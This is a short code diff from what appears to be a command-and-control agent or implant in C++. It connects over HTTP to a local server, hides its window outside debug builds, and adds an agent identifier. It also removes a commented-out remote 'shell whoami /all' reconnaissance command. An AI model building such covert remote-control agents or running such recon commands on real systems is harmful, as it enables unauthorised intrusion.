@@ -8,13 +8,12 @@
 
 int main(int argc, char* argv[]) {
 	core c;
-
-	// test cmd execution
-	// [DONE] we need to update the process functions to redirect everything from STDOUT to a pipe (anon or named - TBD) - see this: https://stackoverflow.com/questions/42402673/createprocess-and-capture-stdout @teodor
+	if (argc == 2) {
+		std::string id(argv[1]);
+		c.identifier = id;
+	}
 
 	HttpCommunicator httpCommunicator("127.0.0.1", 8080);
-
-	//c.execute_command("shell whoami /all");
 
 	// Hide windows - Show only in debug
 	if (true) {
